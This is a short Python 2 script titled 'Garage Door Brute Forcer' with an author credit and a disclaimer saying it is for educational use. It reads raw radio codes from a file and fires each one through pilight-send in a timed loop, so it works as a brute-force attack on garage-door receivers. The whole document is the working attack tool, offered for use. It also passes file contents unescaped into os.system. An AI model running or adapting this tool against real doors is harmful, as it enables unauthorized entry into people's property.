# -*- coding: cp1254 -*-
# Garage Door Brute Forcer v1.0
# Author: Mert SARICA
# E-mail: mert [ . ] sarica [ @ ] gmail [ . ] com
# URL: http://www.mertsarica.com
# This tool is provided for educational purposes only, use at your own risk

import os
import sys
import time
import threading
from threading import *

screenLock = Semaphore(value=1)

def cls():
    if sys.platform == 'linux-i386' or sys.platform == 'linux2':
        os.system("clear")
    elif sys.platform == 'win32':
        os.system("cls")
    else:
        os.system("cls")

def do_bf():
	i = 0
	try:
                filename = "codes.txt"
		FILE  = open (filename,"r" )   
		codes = FILE.readlines()
		FILE.close()
	except IOError:
		screenLock.acquire()
		print "[+] codes.txt file not found! \n[+] Please put codes into codes.txt and re-run the program\n"
		screenLock.release()
		sys.exit(1)
	
	for code in codes:
		if code.find("#") >= 0:
			continue
                cmd = 'pilight-send -p raw -c "' + code.strip() + '"'
		screenLock.acquire()
		i = i + 1
		print(str(i) + " | " + cmd)
		screenLock.release()
		os.system(cmd)
		time.sleep(0.2)
			
if __name__ == '__main__':
	cls() 	
	print "===================================================="
	print u"Garage Door Brute Forcer [http://www.mertsarica.com]"
	print "===================================================="
	if len(sys.argv) < 1:
		print "Usage: python pilight-bf.py\n"
		sys.exit(1)
	
	try:
		t = Thread(target=do_bf, args=())
		t.start()
            # do_bf()
        except KeyboardInterrupt:	
            print "[+] Bye..."
